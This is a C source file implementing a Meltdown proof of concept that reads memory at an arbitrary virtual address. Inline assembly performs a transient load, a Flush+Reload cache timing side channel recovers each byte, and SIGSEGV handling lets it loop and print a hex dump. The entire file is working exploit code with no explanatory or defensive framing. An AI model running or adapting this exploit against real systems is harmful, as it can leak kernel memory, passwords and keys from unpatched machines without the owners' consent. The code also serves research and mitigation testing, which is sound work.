#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <memory.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <x86intrin.h>

#include "color_print.h"

#define TARGET_OFFSET 12
#define TARGET_SIZE (1 << TARGET_OFFSET)
#define BITS_READ 8
#define VARIANTS_READ (1 << BITS_READ)

static jmp_buf jmp_dst;
size_t cache_miss_threshold;

char target_array[VARIANTS_READ * TARGET_SIZE];

static void __always_inline meltdown(size_t addr)
{
  asm volatile("1:\n"
               "movq (%%rsi), %%rsi\n"
               "movzx (%%rcx), %%rax\n"
               "shl $12, %%rax\n"
               "jz 1b\n"
               "movq (%%rbx,%%rax,1), %%rbx\n"
               :
               : "c"(addr), "b"(target_array), "S"(0)
               : "rax");
}

static inline int get_access_time(void *p)
{
  uint64_t st, ed;
  uint32_t junk;
  st = __rdtscp(&junk);
  asm volatile("movq (%0), %%rax\n"
               :
               : "c"(p)
               : "rax");
  ed = __rdtscp(&junk);
  return ed - st;
}

static inline void flush(void *p)
{
  _mm_clflush(p);
}

static int __always_inline is_in_cache(void *ptr)
{
  uint64_t atime;
  uint32_t junk;

  atime = get_access_time(ptr);

  flush(ptr);

  if (atime < cache_miss_threshold)
  {
    return 1;
  }
  return 0;
}

#define ESTIMATE_CYCLE 1000000
static void set_cache_hit_threshold()
{
  size_t cached = 0, uncached = 0, i;
  size_t dummy[16];
  size_t *ptr = dummy + 8;

  get_access_time(ptr);
  for (i = 0; i < ESTIMATE_CYCLE; i++)
  {
    cached += get_access_time(ptr);
  }
  for (i = 0; i < ESTIMATE_CYCLE; i++)
  {
    flush(ptr);
    uncached += get_access_time(ptr);
  }
  cached /= ESTIMATE_CYCLE;
  uncached /= ESTIMATE_CYCLE;

  cache_miss_threshold = (uncached + cached * 2) / 3;
  print(INFO, "Detected cycles: cached: %zd, uncached: %zd, threshold: %zd\n", cached, uncached, cache_miss_threshold);
}

static void sig_handler(int signum)
{
  sigset_t sigs;
  sigemptyset(&sigs);
  sigaddset(&sigs, SIGSEGV);
  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
  longjmp(jmp_dst, 1);
}

int __attribute__((optimize("-Os"), noinline)) read_byte_impl(size_t addr)
{
  size_t retries = 1000;

  while (retries--)
  {
    if (!setjmp(jmp_dst))
    {
      meltdown(addr);
    }

    int i, mix_i;
    for (i = 0; i < VARIANTS_READ; i++)
    {
      mix_i = ((i * 167) + 13) & 255;
      if (is_in_cache(&target_array[mix_i * TARGET_SIZE]))
      {
        if (mix_i >= 1)
        {
          return mix_i;
        }
      }
      sched_yield();
    }
    sched_yield();
  }
  return 0;
}

int __attribute__((optimize("-O0"))) read_byte(size_t addr)
{
  char res_stat[256];
  int i, j, r;
  for (i = 0; i < 256; i++)
    res_stat[i] = 0;

  sched_yield();

  for (i = 0; i < 3; i++)
  {
    res_stat[read_byte_impl(addr)]++;
  }
  int max = 0, max_i = 0;

  for (i = 1; i < VARIANTS_READ; i++)
  {
    if (res_stat[i] > max && res_stat[i] >= 1)
    {
      max = res_stat[i];
      max_i = i;
    }
  }
  return max_i;
}

static char *progname;
int usage(void)
{
  printf("%s: [virtual addr] [size]\n", progname);
  return 2;
}

int main(int argc, char *argv[])
{
  int ret;
  unsigned long addr, size;

  progname = argv[0];
  if (argc < 3)
    return usage();

  if (sscanf(argv[1], "%lx", &addr) != 1)
    return usage();

  if (sscanf(argv[2], "%lx", &size) != 1)
    return usage();

  memset(target_array, 1, sizeof(target_array));

  signal(SIGSEGV, sig_handler);

  set_cache_hit_threshold();

  int width = 16;
  if (width > size)
    width = size;
  char buffer[width];

  print(SUCCESS, "Start dumping memory...\n");

  for (int i = 0; i < size; i++)
  {
    ret = read_byte(addr);
    if (ret == -1)
      ret = 0xff;
    buffer[i % width] = ret;

    if ((i + 1) % width == 0)
    {
      printf("0x%10zx: ", addr - (width - 1));
      printf("| ");
      for (int k = 0; k < width; k++)
      {
        printf("%02x ", (unsigned char)buffer[k]);
      }
      printf("| ");
      for (int k = 0; k < width; k++)
      {
        printf("%c", (buffer[k] >= 32 && buffer[k] <= 126) ? buffer[k] : '.');
      }
      printf(" |\n");
    }

    addr++;
  }
}
